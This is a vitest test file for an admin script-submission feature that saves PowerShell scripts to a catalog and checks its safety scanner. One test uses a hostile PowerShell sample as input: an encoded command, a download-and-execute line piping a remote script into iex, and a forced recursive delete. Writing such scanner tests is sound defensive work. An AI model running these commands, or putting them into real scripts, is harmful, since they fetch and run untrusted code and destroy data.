import { mkdtemp, readFile, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import { saveAdminScriptSubmission, type AdminScriptSubmissionInput } from "./admin-submit";

const baseInput: AdminScriptSubmissionInput = {
  title: "Collect Windows Inventory",
  version: "1.0.0",
  category: "Endpoint Tools",
  subcategory: "Inventory",
  tags: ["powershell", "windows"],
  author_name: "OperatorOS ScriptForge",
  author_email: "scripts@operatoros.net",
  author_organization: "Shotgun Ninjas Productions",
  summary: "Collects endpoint inventory.",
  description: "Collects baseline endpoint inventory for admin review.",
  use_case: "Use during endpoint triage.",
  requirements: ["PowerShell 5.1 or newer"],
  parameters: ["ComputerName"],
  examples: ["./Collect-WindowsInventory.ps1"],
  output_format: "json",
  output_description: "Inventory JSON.",
  script_body: "Get-ComputerInfo | ConvertTo-Json",
  documentation_readme: "Run from an approved technician context.",
  documentation_changelog: "1.0.0 - Initial version.",
  monetization_tier: "operator",
  entitlement_required: true,
  review_status: "approved",
  reviewed_by: "OperatorOS Admin",
  submitter_name: "OperatorOS Admin",
  submitter_email: "admin@operatoros.net",
  license: "Proprietary",
  attribution_required: false,
};

describe("admin script submission", () => {
  it("saves approved OperatorOS scripts to the approved catalog path", async () => {
    const rootDir = await mkdtemp(join(tmpdir(), "scriptforge-"));

    try {
      const result = await saveAdminScriptSubmission(baseInput, rootDir);

      expect(result.submission.source_type).toBe("operatoros");
      expect(result.submission.review_status).toBe("approved");
      expect(result.folderPath).toContain(join("content", "scripts", "operatoros", "endpoint-tools", "collect-windows-inventory"));
      await expect(readFile(result.files.script, "utf8")).resolves.toContain("Get-ComputerInfo");
      await expect(readFile(result.files.metadata, "utf8")).resolves.toContain('"source_type": "operatoros"');
      await expect(readFile(result.files.readme, "utf8")).resolves.toContain("# Collect Windows Inventory");
    } finally {
      await rm(rootDir, { recursive: true, force: true });
    }
  });

  it("saves trusted drafts under the private draft branch", async () => {
    const rootDir = await mkdtemp(join(tmpdir(), "scriptforge-"));

    try {
      const result = await saveAdminScriptSubmission(
        {
          ...baseInput,
          review_status: "trusted_draft",
        },
        rootDir,
      );

      expect(result.folderPath).toContain(join("content", "scripts", "operatoros", "_drafts", "endpoint-tools"));
      expect(result.submission.review_status).toBe("trusted_draft");
    } finally {
      await rm(rootDir, { recursive: true, force: true });
    }
  });

  it("blocks approved saves when the safety scan fails", async () => {
    const rootDir = await mkdtemp(join(tmpdir(), "scriptforge-"));

    try {
      await expect(
        saveAdminScriptSubmission(
          {
            ...baseInput,
            script_body: "powershell -EncodedCommand bad; Invoke-WebRequest https://example.com/x.ps1 | iex; Remove-Item C:\\Temp -Recurse -Force",
          },
          rootDir,
        ),
      ).rejects.toThrow("safety scan is failed");
    } finally {
      await rm(rootDir, { recursive: true, force: true });
    }
  });
});
